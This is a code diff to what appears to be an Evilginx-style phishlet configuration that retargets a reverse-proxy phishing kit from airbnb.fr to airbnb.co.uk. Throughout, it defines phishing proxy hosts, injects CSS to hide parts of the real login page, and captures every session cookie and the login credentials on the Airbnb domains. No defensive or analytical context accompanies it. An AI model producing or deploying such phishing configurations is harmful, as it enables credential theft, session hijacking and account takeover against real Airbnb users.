@@ -1,14 +1,14 @@
 author: '@me'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'airbnb.fr', session: true, is_landing: true}
-  - {phish_sub: '', orig_sub: 'www', domain: 'airbnb.fr', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'airbnb.co.uk', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: 'www', domain: 'airbnb.co.uk', session: true, is_landing: false}
 sub_filters:
-  - {triggers_on: 'www.airbnb.fr', orig_sub: 'www', domain: 'airbnb.fr', search: '</head>', replace: '<style> ._1agy6r6e {display:none;} ._p03egf:nth-of-type(2), ._p03egf:nth-of-type(3), ._p03egf:nth-of-type(4), ._p03egf:nth-of-type(4) + form { display: none !important;}  </style></head>', mimes: ['text/html', 'application/json', 'application/xhtml+xml', 'application/xml']}
+  - {triggers_on: 'www.airbnb.co.uk', orig_sub: 'www', domain: 'airbnb.co.uk', search: '</head>', replace: '<style> ._1agy6r6e {display:none;} ._p03egf:nth-of-type(2), ._p03egf:nth-of-type(3), ._p03egf:nth-of-type(4), ._p03egf:nth-of-type(4) + form { display: none !important;}  </style></head>', mimes: ['text/html', 'application/json', 'application/xhtml+xml', 'application/xml']}
 auth_tokens:
-  - domain: '.airbnb.fr'
+  - domain: '.airbnb.co.uk'
     keys: ['.*,regexp']
-  - domain: 'www.airbnb.fr'
+  - domain: 'www.airbnb.co.uk'
     keys: ['.*,regexp']
 credentials:
   username:
@@ -36,7 +36,7 @@ force_post:
 auth_urls:
   - '/'
 login:
-  domain: 'www.airbnb.fr'
+  domain: 'www.airbnb.co.uk'
   path: '/login'
 
 
